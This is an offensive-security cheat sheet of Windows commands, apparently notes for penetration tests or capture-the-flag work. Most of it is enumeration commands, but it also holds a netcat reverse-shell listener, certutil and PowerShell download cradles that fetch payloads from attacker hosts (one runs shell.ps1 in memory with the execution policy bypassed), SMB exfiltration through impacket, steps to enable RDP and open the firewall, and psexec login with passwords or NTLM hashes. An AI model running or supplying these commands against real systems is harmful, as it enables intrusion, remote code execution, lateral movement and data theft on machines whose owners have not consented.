---
title: Windows Commands 
---

## Reverse Shell

https://redteamtutorials.com/2018/10/24/msfvenom-cheatsheet/

nc -lvp 4444

## Windows Commands

Find installed patches, architecture, OS version
```cmd
systeminfo
```
Machine name
```cmd
hostname
```
What is my username?
```cmd
whoami
```
What users/localgroups are on the machine?
```cmd
net users
net localgroups
```
More info about a specific user. Check if user has privileges
```cmd
net user <user1>
```
User privilege
```cmd
whoami /priv
```
Disk Drive
```cmd
wmic logicaldisk get caption,description,providername`
```
Download file in the target machine
```cmd
certutil -urlcache -f http://[attackerIp]/payload.exe payload.exe
```
File and directory permission
```cmd
cacls /Desktop/test.txt
accesschk.exe -qwsu "<user>" "<path>"
accesschk.exe -qwsu "Users" *
```
wmic service filter
```cmd
wmic service where "name= 'OpenSSHd'" get name,pathname,status
```
List of Service
```cmd
wmic service get Caption,StartName,State,pathname
```
List of Process
```cmd
wmic process get ProcessID,ExecutablePath
```
Network
```cmd
ipconfig /all
route print
arp -A
```
Port forward & connect form linux to SMB 
```cmd
# Port forward using plink
plink.exe -l root -pw mysecretpassword 192.168.0.101 -R 8080:127.0.0.1:8080
```
```cmd
winexe -U [user]%[password] //[IP] "cmd.exe"
```
> Note: in ssh_config uncomment PermitRootLogin yes

Firewall Configuration
```cmd
netsh firewall show state
netsh firewall show config
```
Evarioment Variable
```cmd
set
```
How well patched is the system?
```cmd
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
Loading Powershell scripts directly in memory
```cmd
powershell.exe -ep Bypass -c "IEX ((new-object net.webclient).downloadstring('http://10.0.1.14:80/shell.ps1'))"
```
Downlaod file with Powershell 
```cmd
powershell.exe -ep Bypass -c iex ((New-Object System.Net.WebClient).DownloadFile("https://attacker/payload.exe", "C:\Users\user1\payload.exe"))
```
SMB Exfiltration
```cmd
kali_op1> impacket-smbserver -smb2support kali `pwd`
MD-Wind> net use \\10.10.14.14\kali
```
Information about process
```cmd
tasklist /v
```
Run a command as another user
```cmd
runas /user:<localmachinename>\administrator cmd
```
Process info
```cmd
wmic process get Caption,Commandline,Processid
```
Service info
```cmd
wmic service get name,status,startname,pathname
```
Process Owner 
```cmd
tasklist /V /FI "IMAGENAME eq explorer.exe"
wmic process where "name='taskeng.exe'" call GetOwner
```
Process List 
```cmd
powershell.exe Get-Process  | Select-Object Id,Name,Path
```
Current Connection
```cmd
netstat -lpno
```
Start and stop a service
```cmd
net start/stop servicename
```
Installed applications
```cmd
psinfo.exe -s
```
UAC is enable?
```cmd
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
```
Content of a file
```cmd
more file.txt
```
RDP from Kali
```cmd
rdesktop -u user -p password <IP> -g 95% 
```
Enable rdp
```cmd
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
```cmd
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```
Psexec

Password
```cmd
python3 psexec.py user:password@<ip>
```
```cmd
python3 psexec.py -hashes LMHASH:NTHASH user@<ip>
```
